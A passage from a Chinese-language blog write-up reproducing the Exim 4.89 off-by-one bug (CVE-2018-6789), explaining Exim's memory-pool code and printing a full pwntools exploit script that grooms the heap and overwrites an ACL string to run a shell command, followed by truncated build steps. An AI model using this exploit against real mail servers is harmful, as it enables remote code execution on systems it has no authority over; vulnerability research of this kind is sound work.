class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">store_reset_3(<span class="keyword">void</span> *ptr, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> linenumber)</span><br><span class="line">&#123;</span><br><span class="line">storeblock * bb;</span><br><span class="line">storeblock * b = current_block[store_pool];</span><br><span class="line"><span class="keyword">char</span> * bc = CS b + ALIGNED_SIZEOF_STOREBLOCK;</span><br><span class="line"><span class="keyword">int</span> newlength;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Last store operation was not a get */</span></span><br><span class="line"></span><br><span class="line">store_last_get[store_pool] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* See if the place is in the current block - as it often will be. Otherwise,</span></span><br><span class="line"><span class="comment">search for the block in which it lies. */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CS ptr &lt; bc || CS ptr &gt; bc + b-&gt;length)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">//从chainbase开始查找ptr所在的storeblock</span></span><br><span class="line">  <span class="keyword">for</span> (b = chainbase[store_pool]; b; b = b-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">    bc = CS b + ALIGNED_SIZEOF_STOREBLOCK;</span><br><span class="line">    <span class="keyword">if</span> (CS ptr &gt;= bc &amp;&amp; CS ptr &lt;= bc + b-&gt;length) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (!b)</span><br><span class="line">    log_write(<span class="number">0</span>, LOG_MAIN|LOG_PANIC_DIE, <span class="string">"internal error: store_reset(%p) "</span></span><br><span class="line">      <span class="string">"failed: pool=%d %-14s %4d"</span>, ptr, store_pool, filename, linenumber);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Back up, rounding to the alignment if necessary. When testing, flatten</span></span><br><span class="line"><span class="comment">the released memory. */</span></span><br><span class="line"><span class="comment">//设置current block为ptr所在的storeblock，yield_length为newlength，next_yield为ptr</span></span><br><span class="line">newlength = bc + b-&gt;length - CS ptr;</span><br><span class="line">……</span><br><span class="line">(<span class="keyword">void</span>) VALGRIND_MAKE_MEM_NOACCESS(ptr, newlength);</span><br><span class="line">yield_length[store_pool] = newlength - (newlength % alignment);</span><br><span class="line">next_yield[store_pool] = CS ptr + (newlength % alignment);</span><br><span class="line">current_block[store_pool] = b;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free any subsequent block. Do NOT free the first successor, if our</span></span><br><span class="line"><span class="comment">current block has less than 256 bytes left. This should prevent us from</span></span><br><span class="line"><span class="comment">flapping memory. However, keep this block only when it has the default size. */</span></span><br><span class="line"><span class="comment">//如果yield_length&lt;256，并且有next，并且next的大小为0x2000,就保留next storeblock</span></span><br><span class="line"><span class="keyword">if</span> (yield_length[store_pool] &lt; STOREPOOL_MIN_SIZE &amp;&amp;</span><br><span class="line">    b-&gt;next &amp;&amp;</span><br><span class="line">    b-&gt;next-&gt;length == STORE_BLOCK_SIZE)</span><br><span class="line">  &#123;</span><br><span class="line">  b = b-&gt;next;</span><br><span class="line">  ……</span><br><span class="line">  (<span class="keyword">void</span>) VALGRIND_MAKE_MEM_NOACCESS(CS b + ALIGNED_SIZEOF_STOREBLOCK,</span><br><span class="line">		b-&gt;length - ALIGNED_SIZEOF_STOREBLOCK);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">bb = b-&gt;next;</span><br><span class="line">b-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//释放b之后的所有Storeblock</span></span><br><span class="line"><span class="keyword">while</span> ((b = bb))</span><br><span class="line">  &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> COMPILE_UTILITY</span></span><br><span class="line">  <span class="keyword">if</span> (running_in_test_harness || debug_store)</span><br><span class="line">    assert_no_variables(b, b-&gt;length + ALIGNED_SIZEOF_STOREBLOCK,</span><br><span class="line">			filename, linenumber);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  bb = bb-&gt;next;</span><br><span class="line">  pool_malloc -= b-&gt;length + ALIGNED_SIZEOF_STOREBLOCK;</span><br><span class="line">  store_free_3(b, filename, linenumber);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在了解了以上几个管理内存的函数后，继续研究在Exim中的哪些环节调用了这些函数，进而能够理解exp中的操作。</p>
<h1 id="Exim中调用内存管理的关键函数"><a href="#Exim中调用内存管理的关键函数" class="headerlink" title="Exim中调用内存管理的关键函数"></a>Exim中调用内存管理的关键函数</h1><p>Exim启动时执行main函数，在main中调用daemo_go，在daemo_go中调用smtp_setup_msg处理客户端的命令，每次用smtp_read_command读取命令，然后根据不同的情况进行处理。</p>
<p>smtp_setup_msg是Exim服务器端比较关键的函数，主要流程的简化代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">smtp_setup_msg()&#123;</span><br><span class="line">  <span class="keyword">int</span> done = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *reset_pointer = store_get(<span class="number">0</span>);</span><br><span class="line">  smtp_reset(reset_pointer);</span><br><span class="line">  ……</span><br><span class="line">  <span class="keyword">while</span>(done&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">  	……</span><br><span class="line">  	<span class="keyword">switch</span>(smtp_read_command(TRUE, GETC_BUFFER_UNLIMITED))&#123;</span><br><span class="line">    	<span class="keyword">case</span> AUTH_CMD:</span><br><span class="line">    		……</span><br><span class="line">    		<span class="keyword">break</span>;</span><br><span class="line">    	<span class="keyword">case</span> HELO_CMD:</span><br><span class="line">    		……</span><br><span class="line">    		<span class="keyword">goto</span> HELO_EHLO;</span><br><span class="line">    	<span class="keyword">case</span> EHLO_CMD:</span><br><span class="line">    		……</span><br><span class="line">    		<span class="keyword">goto</span> HELO_EHLO;</span><br><span class="line">    		</span><br><span class="line">    		HELO_EHLO:</span><br><span class="line">    		<span class="keyword">if</span> (!check_helo(smtp_cmd_data))</span><br><span class="line">    		……</span><br><span class="line">    		smtp_reset(reset_pointer);</span><br><span class="line">    		<span class="keyword">break</span>;</span><br><span class="line">    	……</span><br><span class="line">    	<span class="keyword">default</span>：</span><br><span class="line">    		……</span><br><span class="line">    		done = synprot_error(L_smtp_syntax_error, <span class="number">500</span>, <span class="literal">NULL</span>,US<span class="string">"unrecognized command"</span>);</span><br><span class="line">    		<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面列出的部分就是与内存相关的函数，下面一一介绍。</p>
<h2 id="smtp-reset函数"><a href="#smtp-reset函数" class="headerlink" title="smtp_reset函数"></a>smtp_reset函数</h2><p>smtp_reset最主要的就是调用了store_reset函数，用于释放storeblock。源码这里就不放了，位于smtp_in.c中。</p>
<p>在HELO/EHLO，MAIL，RCPT命令处理结束后，都会调用该函数。</p>
<h2 id="check-helo函数"><a href="#check-helo函数" class="headerlink" title="check_helo函数"></a>check_helo函数</h2><p>check_helo对smtp_cmd_data进行字符的检查，包含了对sender_helo_name指向空间的释放（store_free）和重新分配（store_malloc）。该函数调用与EHLO/HELO命令中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> BOOL</span><br><span class="line">check_helo(uschar *s)</span><br><span class="line">&#123;</span><br><span class="line">uschar *start = s;</span><br><span class="line">uschar *end = s + Ustrlen(s);</span><br><span class="line">BOOL yield = helo_accept_junk;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Discard any previous helo name */</span></span><br><span class="line"><span class="comment">//如果sender_helo_name不为空，释放所指内存并置空</span></span><br><span class="line"><span class="keyword">if</span> (sender_helo_name != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  store_free(sender_helo_name);</span><br><span class="line">  sender_helo_name = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Skip tests if junk is permitted. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!yield)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allow the new standard form for IPv6 address literals, namely,</span></span><br><span class="line"><span class="comment">  [IPv6:....], and because someone is bound to use it, allow an equivalent</span></span><br><span class="line"><span class="comment">  IPv4 form. Allow plain addresses as well. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (*s == <span class="string">'['</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Non-literals must be alpha, dot, hyphen, plus any non-valid chars</span></span><br><span class="line"><span class="comment">  that have been configured (usually underscore - sigh). */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*s)</span><br><span class="line">    <span class="keyword">for</span> (yield = TRUE; *s; s++)</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*s) &amp;&amp; *s != <span class="string">'.'</span> &amp;&amp; *s != <span class="string">'-'</span> &amp;&amp;</span><br><span class="line">          Ustrchr(helo_allow_chars, *s) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        yield = FALSE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Save argument if OK */</span></span><br><span class="line"><span class="comment">//重新分配内存给sender_helo_name</span></span><br><span class="line"><span class="keyword">if</span> (yield) sender_helo_name = string_copy_malloc(start);</span><br><span class="line"><span class="keyword">return</span> yield;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uschar *</span><br><span class="line">string_copy_malloc(<span class="keyword">const</span> uschar *s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> len = Ustrlen(s) + <span class="number">1</span>;</span><br><span class="line">uschar *ss = store_malloc(len);<span class="comment">//调用store_malloc</span></span><br><span class="line"><span class="built_in">memcpy</span>(ss, s, len);</span><br><span class="line"><span class="keyword">return</span> ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="synprot-error函数处理unknown-cmd"><a href="#synprot-error函数处理unknown-cmd" class="headerlink" title="synprot_error函数处理unknown cmd"></a>synprot_error函数处理unknown cmd</h2><p>当用户输入的命令为未知命令时，会进入到default分支，调用synprot_error处理unknown cmd。</p>
<p>synprot_error中调用string_printing处理输入的unknown cmd，为之分配（store_get）空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">synprot_error(<span class="keyword">int</span> type, <span class="keyword">int</span> code, uschar *data, uschar *errmess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> yield = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">log_write(type, LOG_MAIN, <span class="string">"SMTP %s error in \"%s\" %s %s"</span>,</span><br><span class="line">  (type == L_smtp_syntax_error)? <span class="string">"syntax"</span> : <span class="string">"protocol"</span>,</span><br><span class="line">  string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> yield;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> string_printing(s) string_printing2((s), TRUE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> uschar *</span><br><span class="line">string_printing2(<span class="keyword">const</span> uschar *s, BOOL allow_tab)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//s即为unknown cmd</span></span><br><span class="line"><span class="keyword">int</span> nonprintcount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> uschar *t = s;</span><br><span class="line">uschar *ss, *tt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*t != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">int</span> c = *t++;</span><br><span class="line">  <span class="comment">//nonprintcount为不可打印字符的个数</span></span><br><span class="line">  <span class="keyword">if</span> (!mac_isprint(c) || (!allow_tab &amp;&amp; c == <span class="string">'\t'</span>)) nonprintcount++;</span><br><span class="line">  length++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nonprintcount == <span class="number">0</span>) <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get a new block of store guaranteed big enough to hold the</span></span><br><span class="line"><span class="comment">expanded string. */</span></span><br><span class="line"><span class="comment">//为unknown cmd分配空间，当输入的都是不可打印字符时，store_get的参数为4*length+1</span></span><br><span class="line">ss = store_get(length + nonprintcount * <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="auth-cram-md5-server"><a href="#auth-cram-md5-server" class="headerlink" title="auth_cram_md5_server"></a>auth_cram_md5_server</h2><p>在输入AUTH命令时，<code>auth_cram_md5_server</code>函数会被调用。源码中没有体现出来，但是在调试时候能够看见，可能是通过指针调用的。<code>auth_cram_md5_server</code>采用base64编码对数据进行传输，就会调用b64decode。off by one的漏洞就通过AUTH命令来处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">  f <span class="number">1</span>           <span class="number">409b</span>f3 b64decode+<span class="number">68</span></span><br><span class="line">  f <span class="number">2</span>           <span class="number">4832f</span>f auth_cram_md5_server+<span class="number">191</span></span><br><span class="line">  f <span class="number">3</span>           <span class="number">45f</span>306 smtp_setup_msg+<span class="number">2031</span></span><br><span class="line">  f <span class="number">4</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">  f <span class="number">5</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">  f <span class="number">6</span>     <span class="number">7f</span>57f4458830 __libc_start_main+<span class="number">240</span></span><br></pre></td></tr></table></figure>
<p>在有了以上知识之后，就能够比较容易的理解漏洞利用的方法。接下来进入实战环节，对漏洞进行复现。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>把EXP放在这个位置，目的是先在理论层面理解漏洞利用的方法，接着通过gdb调试来对理论进行验证。</p>
<p>脚本来自<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py" target="_blank" rel="noopener">skysider</a> 并根据环境修改了一点点。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ehlo</span><span class="params">(tube, who)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    tube.sendline(<span class="string">"ehlo "</span>+who)</span><br><span class="line">    tube.recv()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">docmd</span><span class="params">(tube, command)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    tube.sendline(command)</span><br><span class="line">    tube.recv()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(tube, command)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    tube.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</span><br><span class="line">    tube.recv()</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    tube.sendline(command)</span><br><span class="line">    tube.recv()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_command</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">    command=<span class="string">"/usr/bin/touch /tmp/success"</span></span><br><span class="line">    context.log_level=<span class="string">'warning'</span></span><br><span class="line">    s = remote(ip, <span class="number">25</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 1. put a huge chunk into unsorted bin </span></span><br><span class="line">    log.info(<span class="string">"send ehlo"</span>)</span><br><span class="line">    ehlo(s, <span class="string">"a"</span>*<span class="number">0x1000</span>) <span class="comment"># 0x2020</span></span><br><span class="line">    raw_input(<span class="string">"after 0x1000"</span>)</span><br><span class="line">    ehlo(s, <span class="string">"a"</span>*<span class="number">0x20</span>)</span><br><span class="line">    raw_input(<span class="string">"after 0x20"</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 2. cut the first storeblock by unknown command</span></span><br><span class="line">    log.info(<span class="string">"send unknown command"</span>)</span><br><span class="line">    docmd(s, <span class="string">"\xee"</span>*<span class="number">0x700</span>)</span><br><span class="line">    raw_input(<span class="string">"after 0x700"</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 3. cut the second storeblock and release the first one</span></span><br><span class="line">    log.info(<span class="string">"send ehlo again to cut storeblock"</span>)</span><br><span class="line">    ehlo(s, <span class="string">"c"</span>*<span class="number">0x2c00</span>)</span><br><span class="line">    raw_input(<span class="string">"after 0x2c00"</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 4. send base64 data and trigger off-by-one</span></span><br><span class="line">    log.info(<span class="string">"overwrite one byte of next chunk"</span>)</span><br><span class="line">    docmd(s, <span class="string">"AUTH CRAM-MD5"</span>)</span><br><span class="line">    payload1 = <span class="string">"d"</span>*(<span class="number">0x2020</span>+<span class="number">0x30</span><span class="number">-0x18</span><span class="number">-1</span>)</span><br><span class="line">    docmd(s, b64encode(payload1)+<span class="string">"EfE"</span>)</span><br><span class="line">    raw_input(<span class="string">"after payload1"</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 5. forge chunk size</span></span><br><span class="line">    log.info(<span class="string">"forge chunk size"</span>)</span><br><span class="line">    docmd(s, <span class="string">"AUTH CRAM-MD5"</span>)</span><br><span class="line">    payload2 = <span class="string">'m'</span>*<span class="number">0x78</span>+p64(<span class="number">0x1f41</span>) </span><br><span class="line">    docmd(s, b64encode(payload2))</span><br><span class="line">    raw_input(<span class="string">"after payload2"</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 6. release extended chunk</span></span><br><span class="line">    log.info(<span class="string">"resend ehlo"</span>)</span><br><span class="line">    ehlo(s, <span class="string">"skysider+"</span>)</span><br><span class="line">    raw_input(<span class="string">"after release extended chunk"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 7. overwrite next pointer of overlapped storeblock</span></span><br><span class="line">    log.info(<span class="string">"overwrite next pointer of overlapped storeblock"</span>)</span><br><span class="line">    docmd(s, <span class="string">"AUTH CRAM-MD5"</span>)</span><br><span class="line">    try_addr = <span class="number">0x1a3e490</span></span><br><span class="line">    payload3 = <span class="string">'a'</span>*<span class="number">0x2bf0</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x2021</span>) +p64(try_addr)+p64(<span class="number">0x2000</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        docmd(s, b64encode(payload3)) </span><br><span class="line">    	raw_input(<span class="string">"after payload3"</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 8. reset storeblocks and retrive the ACL storeblock</span></span><br><span class="line">        log.info(<span class="string">"reset storeblock"</span>)</span><br><span class="line">        ehlo(s, <span class="string">"crashed"</span>)</span><br><span class="line">        raw_input(<span class="string">"after realease storeblock"</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 9. overwrite acl strings</span></span><br><span class="line">        log.info(<span class="string">"overwrite acl strings"</span>)</span><br><span class="line">        payload4 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0xb1</span>) + <span class="string">'t'</span>*(<span class="number">0xb0</span><span class="number">-0x10</span>) + p64(<span class="number">0xb0</span>) + p64(<span class="number">0x1f40</span>)</span><br><span class="line">        payload4 += <span class="string">'t'</span>*(<span class="number">0x1f80</span>-len(payload4))</span><br><span class="line">        auth(s, b64encode(payload4)+<span class="string">'ee'</span>)</span><br><span class="line">        raw_input(<span class="string">"after payload4"</span>)</span><br><span class="line"> </span><br><span class="line">        payload5 = <span class="string">"a"</span>*<span class="number">0x80</span> + <span class="string">"$&#123;run&#123;"</span> + command + <span class="string">"&#125;&#125;\x00"</span></span><br><span class="line">        auth(s, b64encode(payload5)+<span class="string">"ee"</span>)</span><br><span class="line">        raw_input(<span class="string">"after payload5"</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 10. trigger acl check</span></span><br><span class="line">        log.info(<span class="string">"trigger acl check and execute command"</span>)</span><br><span class="line">        s.sendline(<span class="string">"MAIL FROM: &lt;test@163.com&gt;"</span>)</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    execute_command()</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>漏洞利用的思路为：构造三个chunk，第一块用于off by one修改第二块的size；第二块用于修改size后溢出修改掉下一块的next指针；第三块用于伪造躲过free检查的chunk以及提供被修改的next指针。修改掉next为acl_check_mail之后，通过smtp_reset将next指向的storeblock放入unsortedbin，并通过再次分配，覆写掉acl_check_mail中的字符串为要执行的cmd，最后触发acl_check执行cmd。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>环境配置主要是按照skysider的<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile" target="_blank" rel="noopener">Dockerfile</a>进行配置的（但并没有用Docker，只是用了Dockerfile里的命令），也结合了其他师傅的blog。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装依赖库（总结了几个博客中的库，都安上了</span></span><br><span class="line">$apt install libpcre++-dev libdb-dev libxt-dev libxaw7-dev libssl-dev libpcre3-dev</span><br><span class="line"><span class="comment">#下载exim源码</span></span><br><span class="line">$wget https://github.com/Exim/exim/releases/download/exim<span class="number">-4</span>_89/exim<span class="number">-4.89</span>.tar.xz</span><br><span class="line">$tar xf exim<span class="number">-4.89</span>.tar.xz &amp;&amp; cd exim<span class="number">-4.89</span></span><br><span class="line">$cp src/EDITME Local/Makefile &amp;&amp; cp exim_monitor/EDITME Local/eximon.conf</span><br><span class="line"><span class="comment">#手动修改Makefile中的第134行EXIM_USER为当前用户(我的是test),625行 AUTH_CRAM_MD5=yes</span></span><br><span class="line"></span><br><span class="line"><span 